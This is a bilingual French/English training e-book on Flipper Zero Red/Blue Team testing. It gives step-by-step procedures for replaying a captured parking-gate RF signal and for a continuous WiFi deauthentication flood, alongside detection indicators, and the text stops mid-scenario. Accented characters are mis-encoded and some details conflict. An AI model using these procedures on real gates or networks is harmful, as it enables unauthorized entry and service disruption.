<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Team & Blue Team Guide - Flipper Zero Security Testing</title>
    <style>
        
    @page {
        size: A4;
        margin: 2.5cm;
        @top-center {
            content: "Red Team & Blue Team Guide - Flipper Zero Security Testing";
            font-size: 10pt;
            color: #666;
            font-family: Arial, sans-serif;
        }
        @bottom-center {
            content: "Page " counter(page);
            font-size: 10pt;
            color: #666;
            font-family: Arial, sans-serif;
        }
    }
    
    @media print {
        h1 { page-break-before: always; }
        h1, h2, h3, h4 { page-break-after: avoid; }
        pre, blockquote { page-break-inside: avoid; }
        img { max-width: 100% !important; }
    }
    
    body {
        font-family: Georgia, 'Times New Roman', serif;
        line-height: 1.6;
        color: #333;
        font-size: 12pt;
        max-width: 100%;
        margin: 0 auto;
        padding: 20px;
    }
    
    h1 {
        color: #2c3e50;
        font-size: 24pt;
        font-weight: bold;
        margin-top: 40pt;
        margin-bottom: 20pt;
        border-bottom: 3px solid #3498db;
        padding-bottom: 10pt;
        text-align: left;
    }
    
    h2 {
        color: #34495e;
        font-size: 18pt;
        font-weight: bold;
        margin-top: 30pt;
        margin-bottom: 15pt;
        border-bottom: 1px solid #bdc3c7;
        padding-bottom: 5pt;
    }
    
    h3 {
        color: #2c3e50;
        font-size: 15pt;
        font-weight: bold;
        margin-top: 25pt;
        margin-bottom: 12pt;
    }
    
    h4 {
        color: #34495e;
        font-size: 13pt;
        font-weight: bold;
        margin-top: 20pt;
        margin-bottom: 10pt;
    }
    
    p {
        margin-bottom: 12pt;
        text-align: justify;
        orphans: 2;
        widows: 2;
    }
    
    code {
        background-color: #f8f9fa;
        padding: 2pt 4pt;
        border-radius: 3pt;
        font-family: 'Courier New', 'Consolas', monospace;
        font-size: 10pt;
        color: #e74c3c;
        border: 1px solid #e9ecef;
    }
    
    pre {
        background-color: #2c3e50;
        color: #ecf0f1;
        padding: 15pt;
        border-radius: 5pt;
        font-family: 'Courier New', 'Consolas', monospace;
        font-size: 9pt;
        line-height: 1.4;
        overflow-x: auto;
        margin: 15pt 0;
        border: 1px solid #34495e;
        white-space: pre-wrap;
        word-wrap: break-word;
    }
    
    pre code {
        background: none;
        color: #ecf0f1;
        border: none;
        padding: 0;
        font-size: 9pt;
    }
    
    blockquote {
        background-color: #f39c12;
        color: white;
        padding: 12pt 15pt;
        border-left: 5pt solid #e67e22;
        margin: 15pt 0;
        border-radius: 0 5pt 5pt 0;
        font-weight: bold;
    }
    
    table {
        width: 100%;
        border-collapse: collapse;
        margin: 15pt 0;
        font-size: 10pt;
        page-break-inside: avoid;
    }
    
    th, td {
        border: 1pt solid #bdc3c7;
        padding: 8pt;
        text-align: left;
        vertical-align: top;
    }
    
    th {
        background-color: #34495e;
        color: white;
        font-weight: bold;
        font-size: 10pt;
    }
    
    tr:nth-child(even) {
        background-color: #f8f9fa;
    }
    
    ul, ol {
        margin: 12pt 0;
        padding-left: 25pt;
    }
    
    li {
        margin: 6pt 0;
        line-height: 1.5;
    }
    
    strong, b {
        color: #2c3e50;
        font-weight: bold;
    }
    
    em, i {
        color: #7f8c8d;
        font-style: italic;
    }
    
    .toc {
        background-color: #f8f9fa;
        border: 1px solid #dee2e6;
        border-radius: 5pt;
        padding: 15pt;
        margin: 20pt 0;
    }
    
    .toc h2 {
        margin-top: 0;
        color: #2c3e50;
        border-bottom: 1px solid #bdc3c7;
    }
    
    .highlight {
        background-color: #fff3cd;
        border: 1px solid #ffeaa7;
        border-radius: 3pt;
        padding: 10pt;
        margin: 10pt 0;
    }
    
    .warning {
        background-color: #f8d7da;
        border: 1px solid #f5c6cb;
        border-radius: 3pt;
        padding: 10pt;
        margin: 10pt 0;
        color: #721c24;
    }
    
    .info {
        background-color: #d1ecf1;
        border: 1px solid #bee5eb;
        border-radius: 3pt;
        padding: 10pt;
        margin: 10pt 0;
        color: #0c5460;
    }
    
    </style>
</head>
<body>
    <h1 id="red-team-blue-team-guide">Red Team &amp; Blue Team Guide</h1>
<h2 id="flipper-zero-security-testing-car-security-exploits">Flipper Zero Security Testing &amp; Car Security Exploits</h2>
<p><strong>A Comprehensive Professional Guide to Offensive and Defensive Cybersecurity Testing</strong></p>
<p><em>Author: Cybersecurity Professional</em><br />
<em>Publisher: Security Research Publications</em><br />
<em>Publication Date: August 2025</em></p>
<hr />
<h2 id="copyright-and-legal-notice">Copyright and Legal Notice</h2>
<p>¬© 2024 Security Research Publications. All rights reserved.</p>
<p><strong>IMPORTANT LEGAL DISCLAIMER:</strong>
This guide is intended for educational and authorized security testing purposes only. The techniques described should only be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and may result in criminal prosecution.</p>
<p><strong>Publication Information:</strong>
- Title: Red Team &amp; Blue Team Guide: Flipper Zero Security Testing
- Publisher: Security Research Publications
- Publication Date: August 2025
- Language: English
- Format: Professional E-book</p>
<hr />
<h1 id="guide-complet-red-team-blue-team">üìñ Guide Complet Red Team &amp; Blue Team</h1>
<h2 id="utilisation-du-flipper-zero-avec-module-predator">Utilisation du Flipper Zero avec Module Predator</h2>
<h3 id="version-francaise-english-version">Version Fran√ßaise / English Version</h3>
<h3 id="support-de-cours-pratique">Support de Cours Pratique</h3>
<h2 id="table-des-matieres-table-of-contents">üìã Table des Mati√®res / Table of Contents</h2>
<h3 id="partie-i-fondamentaux-fundamentals">Partie I - Fondamentaux / Fundamentals</h3>
<ul>
<li>Introduction et Objectifs</li>
<li>Concepts Red Team vs Blue Team</li>
<li>Description Mat√©rielle</li>
<li>Configuration et Installation</li>
</ul>
<h3 id="partie-ii-techniques-operationnelles-operational-techniques">Partie II - Techniques Op√©rationnelles / Operational Techniques</h3>
<ul>
<li>Attaques RF Sub-GHz</li>
<li>Attaques WiFi</li>
<li>Reconnaissance GPS et Wardriving</li>
<li>Sc√©narios Pratiques</li>
</ul>
<h3 id="partie-iii-defense-et-detection-defense-detection">Partie III - D√©fense et D√©tection / Defense &amp; Detection</h3>
<ul>
<li>Strat√©gies Blue Team</li>
<li>Outils de D√©tection</li>
<li>Contre-mesures</li>
</ul>
<h3 id="partie-iv-pratique-et-ethique-practice-ethics">Partie IV - Pratique et √âthique / Practice &amp; Ethics</h3>
<ul>
<li>Exercices Pratiques</li>
<li>Aspects L√©gaux et √âthiques</li>
<li>Ressources et R√©f√©rences</li>
</ul>
<h2 id="chapitre-1-introduction-et-objectifs">Chapitre 1. Introduction et Objectifs</h2>
<h3 id="introduction-and-objectives">Introduction and Objectives</h3>
<h4 id="objectifs-pedagogiques-learning-objectives">üéØ Objectifs P√©dagogiques / Learning Objectives</h4>
<p><strong>Fran√ßais :</strong> Ce guide vise √† former les √©tudiants aux techniques modernes de simulation d'attaque (Red Team) et de d√©fense (Blue Team) en utilisant le Flipper Zero √©quip√© du module Predator. √Ä l'issue de cette formation, les participants seront capables de :
- Comprendre les principes fondamentaux des tests d'intrusion
- Ma√Ætriser l'utilisation du Flipper Zero et du module Predator
- Identifier les vuln√©rabilit√©s dans les syst√®mes RF, WiFi et IoT
- D√©velopper des strat√©gies de d√©tection et de d√©fense efficaces
- Appliquer les bonnes pratiques √©thiques et l√©gales</p>
<p><strong>English :</strong> This guide aims to train students in modern attack simulation (Red Team) and defense (Blue Team) techniques using the Flipper Zero equipped with the Predator module. Upon completion of this training, participants will be able to:
- Understand fundamental penetration testing principles
- Master the use of Flipper Zero and Predator module
- Identify vulnerabilities in RF, WiFi, and IoT systems
- Develop effective detection and defense strategies
- Apply ethical and legal best practices</p>
<h4 id="avertissement-legal-legal-warning">‚ö†Ô∏è Avertissement L√©gal / Legal Warning</h4>
<p>üî¥ <strong>IMPORTANT - FRAN√áAIS :</strong> L'utilisation du mat√©riel et des techniques pr√©sent√©es dans ce guide doit √™tre strictement limit√©e √† :
- Des environnements de test autoris√©s
- Des missions l√©gales de tests d'intrusion
- Des audits de s√©curit√© avec accord √©crit
- Des exercices p√©dagogiques supervis√©s</p>
<p>Toute utilisation malveillante ou non autoris√©e est interdite et peut √™tre sanctionn√©e p√©nalement.</p>
<p>üî¥ <strong>IMPORTANT - ENGLISH :</strong> The use of equipment and techniques presented in this guide must be strictly limited to:
- Authorized testing environments
- Legal penetration testing missions
- Security audits with written agreement
- Supervised educational exercises</p>
<p>Any malicious or unauthorized use is prohibited and may be subject to criminal penalties.</p>
<h4 id="prerequis-prerequisites">üéì Pr√©requis / Prerequisites</h4>
<p><strong>Connaissances Techniques :</strong>
- Notions de base en r√©seaux (TCP/IP, WiFi)
- Compr√©hension des protocoles radio (RF)
- Bases de la s√©curit√© informatique
- Utilisation de Linux (recommand√©)</p>
<p><strong>Mat√©riel Requis :</strong>
- Flipper Zero
- Module Predator
- Antennes (RF, WiFi, GPS)
- Ordinateur portable avec WiFi
- C√¢bles de connexion</p>
<h2 id="chapitre-2-concepts-fondamentaux-red-team-vs-blue-team">Chapitre 2. Concepts Fondamentaux Red Team vs Blue Team</h2>
<h3 id="fundamental-red-team-vs-blue-team-concepts">Fundamental Red Team vs Blue Team Concepts</h3>
<h4 id="red-team-equipe-offensive-offensive-team">üî¥ Red Team - √âquipe Offensive / Offensive Team</h4>
<p><strong>Fran√ßais :</strong> L'√©quipe Red Team simule un adversaire r√©el avec pour objectif de :
- Identifier les vuln√©rabilit√©s
- Exploiter les failles de s√©curit√©
- Tester la d√©tection et la r√©ponse
- Am√©liorer la posture s√©curitaire globale</p>
<p><strong>M√©thodologie Red Team :</strong>
- Reconnaissance - Collecte d'informations
- √ânum√©ration - Identification des cibles
- Exploitation - Utilisation des vuln√©rabilit√©s
- Post-Exploitation - Maintien de l'acc√®s
- Reporting - Documentation des r√©sultats</p>
<p><strong>English :</strong> The Red Team simulates a real adversary with the objective to:
- Identify vulnerabilities
- Exploit security flaws
- Test detection and response
- Improve overall security posture</p>
<p><strong>Red Team Methodology:</strong>
- Reconnaissance - Information gathering
- Enumeration - Target identification
- Exploitation - Vulnerability utilization
- Post-Exploitation - Access maintenance
- Reporting - Results documentation</p>
<h4 id="blue-team-equipe-defensive-defensive-team">üîµ Blue Team - √âquipe D√©fensive / Defensive Team</h4>
<p><strong>Fran√ßais :</strong> L'√©quipe Blue Team d√©fend l'infrastructure avec pour mission de :
- D√©tecter les intrusions
- Analyser les incidents
- R√©pondre aux menaces
- Am√©liorer les d√©fenses</p>
<p><strong>Activit√©s Blue Team :</strong>
- Monitoring - Surveillance continue
- Analysis - Analyse des logs et alertes
- Investigation - Enqu√™te sur les incidents
- Response - R√©action aux menaces
- Improvement - Am√©lioration des d√©fenses</p>
<p><strong>English :</strong> The Blue Team defends the infrastructure with the mission to:
- Detect intrusions
- Analyze incidents
- Respond to threats
- Improve defenses</p>
<p><strong>Blue Team Activities:</strong>
- Monitoring - Continuous surveillance
- Analysis - Log and alert analysis
- Investigation - Incident investigation
- Response - Threat response
- Improvement - Defense enhancement</p>
<h4 id="purple-team-collaboration-collaboration">üü£ Purple Team - Collaboration / Collaboration</h4>
<p><strong>Concept Purple Team :</strong> Approche collaborative o√π Red Team et Blue Team travaillent ensemble pour :
- Partager les connaissances
- Am√©liorer les techniques d'attaque et de d√©fense
- Optimiser les processus de d√©tection
- R√©duire le temps de r√©ponse aux incidents</p>
<h2 id="chapitre-3-description-materielle-detaillee">Chapitre 3. Description Mat√©rielle D√©taill√©e</h2>
<h3 id="detailed-hardware-description">Detailed Hardware Description</h3>
<h4 id="flipper-zero-vue-densemble-overview">üê¨ Flipper Zero - Vue d'Ensemble / Overview</h4>
<p><strong>Fran√ßais :</strong> Le Flipper Zero est un outil polyvalent de tests de p√©n√©tration physique et radio. Ses caract√©ristiques principales :</p>
<p><strong>Sp√©cifications Techniques :</strong>
- Processeur : STM32WB55 (Cortex-M4 64 MHz)
- M√©moire : 256 KB RAM, 1 MB Flash
- √âcran : LCD monochrome 128x64
- Interface : 5 boutons directionnels
- Connectivit√© : USB-C, Bluetooth, Sub-GHz
- GPIO : 18 pins pour extensions
- Alimentation : Batterie 2000 mAh</p>
<p><strong>English :</strong> The Flipper Zero is a versatile physical and radio penetration testing tool. Main features:</p>
<p><strong>Technical Specifications:</strong>
- Processor: STM32WB55 (Cortex-M4 64 MHz)
- Memory: 256 KB RAM, 1 MB Flash
- Display: Monochrome LCD 128x64
- Interface: 5 directional buttons
- Connectivity: USB-C, Bluetooth, Sub-GHz
- GPIO: 18 pins for extensions
- Power: 2000 mAh battery</p>
<h4 id="module-predator-specifications-detaillees-detailed-specifications">üì° Module Predator - Sp√©cifications D√©taill√©es / Detailed Specifications</h4>
<p><strong>Architecture du Module :</strong></p>
<div class="codehilite"><pre><span></span><code>‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ           MODULE PREDATOR           ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  üì° RF Sub-GHz (433 MHz)           ‚îÇ
‚îÇ  ‚Ä¢ CC1101 Transceiver              ‚îÇ
‚îÇ  ‚Ä¢ Antenne helicoidale             ‚îÇ
‚îÇ  ‚Ä¢ Port√©e : 100-500m               ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  üì∂ WiFi Module (2.4 GHz)          ‚îÇ
‚îÇ  ‚Ä¢ ESP32-S2 Microcontroller        ‚îÇ
‚îÇ  ‚Ä¢ Interface AP/Station            ‚îÇ
‚îÇ  ‚Ä¢ Antenne PCB int√©gr√©e            ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  üõ∞Ô∏è GPS Module                      ‚îÇ
‚îÇ  ‚Ä¢ R√©cepteur GNSS                  ‚îÇ
‚îÇ  ‚Ä¢ Pr√©cision : &lt;3m                 ‚îÇ
‚îÇ  ‚Ä¢ Time to Fix : &lt;30s              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  üîå Connectivit√©                    ‚îÇ
‚îÇ  ‚Ä¢ GPIO Flipper Zero               ‚îÇ
‚îÇ  ‚Ä¢ USB-C (donn√©es + charge)        ‚îÇ
‚îÇ  ‚Ä¢ Batterie interne 1500 mAh       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
</code></pre></div>

<h4 id="composants-et-fonctionnalites-components-and-features">üîß Composants et Fonctionnalit√©s / Components and Features</h4>
<p><strong>Module RF Sub-GHz</strong></p>
<p><strong>Fran√ßais :</strong>
- Fr√©quences support√©es : 300-928 MHz
- Modulations : ASK, FSK, MSK, GFSK
- Puissance de transmission : +10 dBm max
- Sensibilit√© : -110 dBm
- Applications : T√©l√©commandes, capteurs IoT, alarmes</p>
<p><strong>English :</strong>
- Supported frequencies: 300-928 MHz
- Modulations: ASK, FSK, MSK, GFSK
- Transmission power: +10 dBm max
- Sensitivity: -110 dBm
- Applications: Remote controls, IoT sensors, alarms</p>
<p><strong>Module WiFi ESP32-S2</strong></p>
<p><strong>Capacit√©s WiFi :</strong>
- Standards : 802.11 b/g/n
- Modes : Station, Access Point, Monitor
- S√©curit√© : WEP, WPA/WPA2-PSK, WPA2-Enterprise
- D√©bit : Jusqu'√† 150 Mbps
- Canaux : 1-14 (2.4 GHz)</p>
<p><strong>Module GPS</strong></p>
<p><strong>Caract√©ristiques de localisation :</strong>
- Constellations : GPS, GLONASS, Galileo, BeiDou
- Pr√©cision : 2.5m CEP (50%)
- Fr√©quence de mise √† jour : 1-10 Hz
- Altitude : Jusqu'√† 18,000m
- Vitesse : Jusqu'√† 515 m/s</p>
<h2 id="chapitre-4-configuration-et-installation">Chapitre 4. Configuration et Installation</h2>
<h3 id="configuration-and-installation">Configuration and Installation</h3>
<h4 id="installation-du-firmware-firmware-installation">üöÄ Installation du Firmware / Firmware Installation</h4>
<p><strong>√âtape 1 : Pr√©paration du Flipper Zero</strong></p>
<p><strong>Fran√ßais :</strong>
- Mise √† jour du firmware officiel</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Via qFlipper (interface graphique)</span>
-<span class="w"> </span>T√©l√©charger<span class="w"> </span>qFlipper<span class="w"> </span>depuis<span class="w"> </span>le<span class="w"> </span>site<span class="w"> </span>officiel
-<span class="w"> </span>Connecter<span class="w"> </span>le<span class="w"> </span>Flipper<span class="w"> </span>Zero<span class="w"> </span>en<span class="w"> </span>USB
-<span class="w"> </span>Cliquer<span class="w"> </span>sur<span class="w"> </span><span class="s2">&quot;Update&quot;</span><span class="w"> </span>pour<span class="w"> </span>installer<span class="w"> </span>la<span class="w"> </span>derni√®re<span class="w"> </span>version
</code></pre></div>

<ul>
<li>Installation du firmware Predator</li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="c1"># Via ligne de commande</span>
git<span class="w"> </span>clone<span class="w"> </span>https://github.com/flipperdevices/flipperzero-firmware
<span class="nb">cd</span><span class="w"> </span>flipperzero-firmware
./fbt<span class="w"> </span>flash_usb
</code></pre></div>

<p><strong>√âtape 2 : Montage du Module Predator</strong></p>
<p><strong>Proc√©dure de montage :</strong>
1. √âteindre le Flipper Zero
2. Connecter le module Predator sur les pins GPIO
3. Visser les antennes (RF, WiFi, GPS)
4. Connecter le c√¢ble d'alimentation USB-C
5. Red√©marrer le Flipper Zero</p>
<p><strong>V√©rification de l'installation :</strong>
1. Menu principal ‚Üí Apps ‚Üí GPIO ‚Üí Predator
2. V√©rifier l'affichage des trois modules (RF, WiFi, GPS)
3. Tester la connectivit√© WiFi (AP Predator_XXXX visible)</p>
<h2 id="chapitre-5-scenarios-de-test-detailles-avec-exemples">Chapitre 5. Sc√©narios de Test D√©taill√©s avec Exemples</h2>
<h3 id="detailed-testing-scenarios-with-examples">Detailed Testing Scenarios with Examples</h3>
<h4 id="scenario-1-intrusion-physique-via-rf-parkingportail">üî¥ Sc√©nario 1 : Intrusion Physique via RF (Parking/Portail)</h4>
<h3 id="physical-intrusion-via-rf-parkinggate">Physical Intrusion via RF (Parking/Gate)</h3>
<p><strong>Contexte / Context</strong></p>
<p><strong>Fran√ßais :</strong> Test d'acc√®s non autoris√© √† un parking d'entreprise via capture et rejeu de signal RF. </p>
<p><strong>English :</strong> Testing unauthorized access to corporate parking via RF signal capture and replay.</p>
<p><strong>Mat√©riel n√©cessaire / Required Equipment</strong>
- Flipper Zero + Module Predator
- Antenne Sub-GHz 433 MHz
- V√©hicule test (optionnel)
- Cam√©ra pour documentation</p>
<p><strong>Proc√©dure Red Team D√©taill√©e / Detailed Red Team Procedure</strong></p>
<p><em>Phase 1 : Reconnaissance</em></p>
<div class="codehilite"><pre><span></span><code>Flipper<span class="w"> </span>Zero<span class="w"> </span>‚Üí<span class="w"> </span>SubGHz<span class="w"> </span>‚Üí<span class="w"> </span>Read<span class="w"> </span>RAW
-<span class="w"> </span>Fr√©quence<span class="w"> </span>:<span class="w"> </span><span class="m">433</span>.92<span class="w"> </span>MHz
-<span class="w"> </span>Se<span class="w"> </span>positionner<span class="w"> </span>pr√®s<span class="w"> </span>du<span class="w"> </span>portail<span class="w"> </span><span class="o">(</span><span class="m">5</span>-10m<span class="o">)</span>
-<span class="w"> </span>Attendre<span class="w"> </span>qu<span class="err">&#39;</span>un<span class="w"> </span>employ√©<span class="w"> </span>utilise<span class="w"> </span>sa<span class="w"> </span>t√©l√©commande
-<span class="w"> </span>Enregistrer<span class="w"> </span>le<span class="w"> </span>signal<span class="w"> </span><span class="o">(</span>dur√©e<span class="w"> </span>:<span class="w"> </span><span class="m">5</span>-10<span class="w"> </span>secondes<span class="o">)</span>
</code></pre></div>

<p><em>Exemple de capture :</em>
- Signal captur√© : 433.920 MHz
- Dur√©e : 2.3 secondes
- Modulation : ASK/OOK
- D√©bit : 1000 baud
- Donn√©es : 1010101100110011...</p>
<p><em>Phase 2 : Analyse du signal</em></p>
<div class="codehilite"><pre><span></span><code>-<span class="w"> </span>Analyser<span class="w"> </span>la<span class="w"> </span>forme<span class="w"> </span>d<span class="err">&#39;</span>onde
-<span class="w"> </span>Identifier<span class="w"> </span>le<span class="w"> </span>protocole<span class="w"> </span><span class="o">(</span>Fixed<span class="w"> </span>Code<span class="w"> </span>vs<span class="w"> </span>Rolling<span class="w"> </span>Code<span class="o">)</span>
-<span class="w"> </span>V√©rifier<span class="w"> </span>la<span class="w"> </span>r√©p√©tition<span class="w"> </span>du<span class="w"> </span>signal
-<span class="w"> </span>Extraire<span class="w"> </span>la<span class="w"> </span>s√©quence<span class="w"> </span>de<span class="w"> </span>bits
</code></pre></div>

<p><em>Phase 3 : Test de rejeu</em></p>
<div class="codehilite"><pre><span></span><code>Flipper<span class="w"> </span>Zero<span class="w"> </span>‚Üí<span class="w"> </span>SubGHz<span class="w"> </span>‚Üí<span class="w"> </span>Saved<span class="w"> </span>‚Üí<span class="w"> </span><span class="o">[</span>Nom<span class="w"> </span>du<span class="w"> </span>fichier<span class="o">]</span>
-<span class="w"> </span>S√©lectionner<span class="w"> </span>le<span class="w"> </span>signal<span class="w"> </span>enregistr√©
-<span class="w"> </span>Se<span class="w"> </span>positionner<span class="w"> </span>face<span class="w"> </span>au<span class="w"> </span>r√©cepteur
-<span class="w"> </span>Appuyer<span class="w"> </span>sur<span class="w"> </span><span class="s2">&quot;Send&quot;</span><span class="w"> </span>
-<span class="w"> </span>Observer<span class="w"> </span>la<span class="w"> </span>r√©action<span class="w"> </span>du<span class="w"> </span>portail
</code></pre></div>

<p><strong>R√©sultats Attendus / Expected Results</strong>
- ‚úÖ Succ√®s : Portail s'ouvre ‚Üí Vuln√©rabilit√© confirm√©e
- ‚ùå √âchec : Rolling code d√©tect√© ‚Üí Syst√®me s√©curis√©</p>
<p><strong>D√©tection Blue Team / Blue Team Detection</strong></p>
<p><em>Indicateurs de compromission :</em>
- Log d'ouverture sans badge employ√© associ√©
- Ouverture hors horaires normales
- Activit√© r√©p√©t√©e suspecte
- Absence de v√©hicule autoris√© sur les cam√©ras</p>
<p><em>Exemple de log suspect :</em></p>
<div class="codehilite"><pre><span></span><code>[2024-08-26 14:23:15] GATE_OPEN - No badge scan detected
[2024-08-26 14:23:20] GATE_OPEN - No badge scan detected  
[2024-08-26 14:23:25] GATE_OPEN - No badge scan detected
</code></pre></div>

<h4 id="scenario-2-attaque-de-deni-de-service-wifi-deauth-flood">üî¥ Sc√©nario 2 : Attaque de D√©ni de Service WiFi (Deauth Flood)</h4>
<h3 id="wifi-denial-of-service-attack-deauth-flood">WiFi Denial of Service Attack (Deauth Flood)</h3>
<p><strong>Contexte / Context</strong></p>
<p><strong>Fran√ßais :</strong> Perturbation massive du r√©seau WiFi d'entreprise par d√©connexion forc√©e des clients. </p>
<p><strong>English :</strong> Massive disruption of corporate WiFi network by forced client disconnection.</p>
<p><strong>Proc√©dure Red Team D√©taill√©e / Detailed Red Team Procedure</strong></p>
<p><em>Phase 1 : Reconnaissance WiFi</em></p>
<div class="codehilite"><pre><span></span><code>Flipper<span class="w"> </span>Zero<span class="w"> </span>‚Üí<span class="w"> </span>Apps<span class="w"> </span>‚Üí<span class="w"> </span>WiFi<span class="w"> </span>‚Üí<span class="w"> </span>WiFi<span class="w"> </span>Scanner
-<span class="w"> </span>Scan<span class="w"> </span>des<span class="w"> </span>r√©seaux<span class="w"> </span>disponibles
-<span class="w"> </span>Identifier<span class="w"> </span>le<span class="w"> </span>SSID<span class="w"> </span>cible<span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;Corp-WiFi&quot;</span>
-<span class="w"> </span>Noter<span class="w"> </span>le<span class="w"> </span>canal<span class="w"> </span><span class="o">(</span>ex:<span class="w"> </span>Channel<span class="w"> </span><span class="m">6</span><span class="o">)</span>
-<span class="w"> </span>Compter<span class="w"> </span>le<span class="w"> </span>nombre<span class="w"> </span>de<span class="w"> </span>clients<span class="w"> </span>connect√©s
</code></pre></div>

<p><em>Exemple de scan :</em></p>
<div class="codehilite"><pre><span></span><code><span class="n">SSID</span><span class="o">:</span><span class="w"> </span><span class="n">Corp</span><span class="o">-</span><span class="n">WiFi</span>
<span class="n">BSSID</span><span class="o">:</span><span class="w"> </span><span class="n">AA</span><span class="o">:</span><span class="n">BB</span><span class="o">:</span><span class="n">CC</span><span class="o">:</span><span class="n">DD</span><span class="o">:</span><span class="n">EE</span><span class="o">:</span><span class="n">FF</span>
<span class="n">Channel</span><span class="o">:</span><span class="w"> </span><span class="mi">6</span>
<span class="n">Security</span><span class="o">:</span><span class="w"> </span><span class="n">WPA2</span><span class="o">-</span><span class="n">PSK</span>
<span class="n">Signal</span><span class="o">:</span><span class="w"> </span><span class="o">-</span><span class="mi">45</span><span class="w"> </span><span class="n">dBm</span>
<span class="n">Clients</span><span class="o">:</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="n">detected</span>
</code></pre></div>

<p><em>Phase 2 : Analyse des clients</em></p>
<div class="codehilite"><pre><span></span><code>WiFi<span class="w"> </span>‚Üí<span class="w"> </span>Monitor<span class="w"> </span>Mode<span class="w"> </span>‚Üí<span class="w"> </span>Channel<span class="w"> </span><span class="m">6</span>
-<span class="w"> </span>Capturer<span class="w"> </span>le<span class="w"> </span>trafic<span class="w"> </span><span class="m">802</span>.11
-<span class="w"> </span>Identifier<span class="w"> </span>les<span class="w"> </span>adresses<span class="w"> </span>MAC<span class="w"> </span>des<span class="w"> </span>clients
-<span class="w"> </span>Observer<span class="w"> </span>les<span class="w"> </span>trames<span class="w"> </span>de<span class="w"> </span>gestion
-<span class="w"> </span>S√©lectionner<span class="w"> </span>les<span class="w"> </span>cibles<span class="w"> </span>prioritaires
</code></pre></div>

<p><em>Phase 3 : Attaque Deauth cibl√©e</em></p>
<div class="codehilite"><pre><span></span><code>WiFi<span class="w"> </span>‚Üí<span class="w"> </span>Deauth<span class="w"> </span>Attack
-<span class="w"> </span>Target:<span class="w"> </span>Corp-WiFi<span class="w"> </span><span class="o">(</span>AA:BB:CC:DD:EE:FF<span class="o">)</span>
-<span class="w"> </span>Clients:<span class="w"> </span>ALL<span class="w"> </span>ou<span class="w"> </span>s√©lection<span class="w"> </span>sp√©cifique
-<span class="w"> </span>Packets:<span class="w"> </span><span class="m">100</span><span class="w"> </span>par<span class="w"> </span>seconde
-<span class="w"> </span>Duration:<span class="w"> </span>Continu
-<span class="w"> </span>Lancer<span class="w"> </span>l<span class="err">&#39;</span>attaque
</code></pre></div>

<p><em>Code de l'attaque (frame 802.11) :</em></p>
<div class="codehilite"><pre><span></span><code><span class="nx">Frame</span><span class="w"> </span><span class="nx">Type</span><span class="p">:</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
<span class="nx">Subtype</span><span class="p">:</span><span class="w"> </span><span class="nx">Deauthentication</span><span class="w"> </span><span class="p">(</span><span class="mh">0x0C</span><span class="p">)</span>
<span class="nx">Destination</span><span class="p">:</span><span class="w"> </span><span class="nx">Broadcast</span><span class="w"> </span><span class="p">(</span><span class="nx">FF</span><span class="p">:</span><span class="nx">FF</span><span class="p">:</span><span class="nx">FF</span><span class="p">:</span><span class="nx">FF</span><span class="p">:</span><span class="nx">FF</span><span class="p">:</span><span class="nx">FF</span><span class="p">)</span>
